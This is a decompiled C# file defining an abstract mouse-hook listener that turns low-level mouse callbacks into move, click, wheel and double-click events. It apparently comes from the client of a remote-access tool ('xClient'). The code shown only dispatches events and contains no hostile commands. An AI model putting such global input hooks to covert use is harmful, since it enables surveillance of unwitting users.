using System;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x0200005F RID: 95
	internal abstract class MouseListener : BaseListener, IMouseEvents
	{
		// Token: 0x06000287 RID: 647 RVA: 0x00003318 File Offset: 0x00001518
		protected MouseListener(Subscribe subscribe) : base(subscribe)
		{
			this.m_PreviousPosition = new Point(-1, -1);
			this.m_DoubleDown = new ButtonSet();
			this.m_SingleDown = new ButtonSet();
		}

		// Token: 0x06000288 RID: 648 RVA: 0x0000E238 File Offset: 0x0000C438
		protected override bool Callback(CallbackData data)
		{
			MouseEventExtArgs eventArgs = this.GetEventArgs(data);
			if (eventArgs.IsMouseKeyDown)
			{
				this.ProcessDown(ref eventArgs);
			}
			if (eventArgs.IsMouseKeyUp)
			{
				this.ProcessUp(ref eventArgs);
			}
			if (eventArgs.WheelScrolled)
			{
				this.ProcessWheel(ref eventArgs);
			}
			if (this.HasMoved(eventArgs.Point))
			{
				this.ProcessMove(ref eventArgs);
			}
			return !eventArgs.Handled;
		}

		// Token: 0x06000289 RID: 649
		protected abstract MouseEventExtArgs GetEventArgs(CallbackData data);

		// Token: 0x0600028A RID: 650 RVA: 0x00003344 File Offset: 0x00001544
		protected virtual void ProcessWheel(ref MouseEventExtArgs e)
		{
			this.OnWheel(e);
		}

		// Token: 0x0600028B RID: 651 RVA: 0x0000E29C File Offset: 0x0000C49C
		protected virtual void ProcessDown(ref MouseEventExtArgs e)
		{
			this.OnDown(e);
			this.OnDownExt(e);
			if (e.Handled)
			{
				return;
			}
			if (e.Clicks == 2)
			{
				this.m_DoubleDown.Add(e.Button);
			}
			if (e.Clicks == 1)
			{
				this.m_SingleDown.Add(e.Button);
			}
		}

		// Token: 0x0600028C RID: 652 RVA: 0x0000E2FC File Offset: 0x0000C4FC
		protected virtual void ProcessUp(ref MouseEventExtArgs e)
		{
			if (this.m_SingleDown.Contains(e.Button))
			{
				this.OnUp(e);
				this.OnUpExt(e);
				if (e.Handled)
				{
					return;
				}
				this.OnClick(e);
				this.m_SingleDown.Remove(e.Button);
			}
			if (this.m_DoubleDown.Contains(e.Button))
			{
				e = e.ToDoubleClickEventArgs();
				this.OnUp(e);
				this.OnDoubleClick(e);
				this.m_DoubleDown.Remove(e.Button);
			}
		}

		// Token: 0x0600028D RID: 653 RVA: 0x0000334E File Offset: 0x0000154E
		private void ProcessMove(ref MouseEventExtArgs e)
		{
			this.m_PreviousPosition = e.Point;
			this.OnMove(e);
			this.OnMoveExt(e);
		}

		// Token: 0x0600028E RID: 654 RVA: 0x0000336D File Offset: 0x0000156D
		private bool HasMoved(Point actualPoint)
		{
			return this.m_PreviousPosition != actualPoint;
		}

		// Token: 0x14000023 RID: 35
		// (add) Token: 0x0600028F RID: 655 RVA: 0x0000E390 File Offset: 0x0000C590
		// (remove) Token: 0x06000290 RID: 656 RVA: 0x0000E3C8 File Offset: 0x0000C5C8
		public event MouseEventHandler MouseMove;

		// Token: 0x14000024 RID: 36
		// (add) Token: 0x06000291 RID: 657 RVA: 0x0000E400 File Offset: 0x0000C600
		// (remove) Token: 0x06000292 RID: 658 RVA: 0x0000E438 File Offset: 0x0000C638
		public event EventHandler<MouseEventExtArgs> MouseMoveExt;

		// Token: 0x14000025 RID: 37
		// (add) Token: 0x06000293 RID: 659 RVA: 0x0000E470 File Offset: 0x0000C670
		// (remove) Token: 0x06000294 RID: 660 RVA: 0x0000E4A8 File Offset: 0x0000C6A8
		public event MouseEventHandler MouseClick;

		// Token: 0x14000026 RID: 38
		// (add) Token: 0x06000295 RID: 661 RVA: 0x0000E4E0 File Offset: 0x0000C6E0
		// (remove) Token: 0x06000296 RID: 662 RVA: 0x0000E518 File Offset: 0x0000C718
		public event MouseEventHandler MouseDown;

		// Token: 0x14000027 RID: 39
		// (add) Token: 0x06000297 RID: 663 RVA: 0x0000E550 File Offset: 0x0000C750
		// (remove) Token: 0x06000298 RID: 664 RVA: 0x0000E588 File Offset: 0x0000C788
		public event EventHandler<MouseEventExtArgs> MouseDownExt;

		// Token: 0x14000028 RID: 40
		// (add) Token: 0x06000299 RID: 665 RVA: 0x0000E5C0 File Offset: 0x0000C7C0
		// (remove) Token: 0x0600029A RID: 666 RVA: 0x0000E5F8 File Offset: 0x0000C7F8
		public event MouseEventHandler MouseUp;

		// Token: 0x14000029 RID: 41
		// (add) Token: 0x0600029B RID: 667 RVA: 0x0000E630 File Offset: 0x0000C830
		// (remove) Token: 0x0600029C RID: 668 RVA: 0x0000E668 File Offset: 0x0000C868
		public event EventHandler<MouseEventExtArgs> MouseUpExt;

		// Token: 0x1400002A RID: 42
		// (add) Token: 0x0600029D RID: 669 RVA: 0x0000E6A0 File Offset: 0x0000C8A0
		// (remove) Token: 0x0600029E RID: 670 RVA: 0x0000E6D8 File Offset: 0x0000C8D8
		public event MouseEventHandler MouseWheel;

		// Token: 0x1400002B RID: 43
		// (add) Token: 0x0600029F RID: 671 RVA: 0x0000E710 File Offset: 0x0000C910
		// (remove) Token: 0x060002A0 RID: 672 RVA: 0x0000E748 File Offset: 0x0000C948
		public event MouseEventHandler MouseDoubleClick;

		// Token: 0x060002A1 RID: 673 RVA: 0x0000E780 File Offset: 0x0000C980
		protected virtual void OnMove(MouseEventArgs e)
		{
			MouseEventHandler mouseMove = this.MouseMove;
			if (mouseMove != null)
			{
				mouseMove(this, e);
			}
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x0000E7A0 File Offset: 0x0000C9A0
		protected virtual void OnMoveExt(MouseEventExtArgs e)
		{
			EventHandler<MouseEventExtArgs> mouseMoveExt = this.MouseMoveExt;
			if (mouseMoveExt != null)
			{
				mouseMoveExt(this, e);
			}
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x0000E7C0 File Offset: 0x0000C9C0
		protected virtual void OnClick(MouseEventArgs e)
		{
			MouseEventHandler mouseClick = this.MouseClick;
			if (mouseClick != null)
			{
				mouseClick(this, e);
			}
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x0000E7E0 File Offset: 0x0000C9E0
		protected virtual void OnDown(MouseEventArgs e)
		{
			MouseEventHandler mouseDown = this.MouseDown;
			if (mouseDown != null)
			{
				mouseDown(this, e);
			}
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x0000E800 File Offset: 0x0000CA00
		protected virtual void OnDownExt(MouseEventExtArgs e)
		{
			EventHandler<MouseEventExtArgs> mouseDownExt = this.MouseDownExt;
			if (mouseDownExt != null)
			{
				mouseDownExt(this, e);
			}
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x0000E820 File Offset: 0x0000CA20
		protected virtual void OnUp(MouseEventArgs e)
		{
			MouseEventHandler mouseUp = this.MouseUp;
			if (mouseUp != null)
			{
				mouseUp(this, e);
			}
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x0000E840 File Offset: 0x0000CA40
		protected virtual void OnUpExt(MouseEventExtArgs e)
		{
			EventHandler<MouseEventExtArgs> mouseUpExt = this.MouseUpExt;
			if (mouseUpExt != null)
			{
				mouseUpExt(this, e);
			}
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x0000E860 File Offset: 0x0000CA60
		protected virtual void OnWheel(MouseEventArgs e)
		{
			MouseEventHandler mouseWheel = this.MouseWheel;
			if (mouseWheel != null)
			{
				mouseWheel(this, e);
			}
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x0000E880 File Offset: 0x0000CA80
		protected virtual void OnDoubleClick(MouseEventArgs e)
		{
			MouseEventHandler mouseDoubleClick = this.MouseDoubleClick;
			if (mouseDoubleClick != null)
			{
				mouseDoubleClick(this, e);
			}
		}

		// Token: 0x040000FE RID: 254
		private readonly ButtonSet m_DoubleDown;

		// Token: 0x040000FF RID: 255
		private readonly ButtonSet m_SingleDown;

		// Token: 0x04000100 RID: 256
		private Point m_PreviousPosition;
	}
}
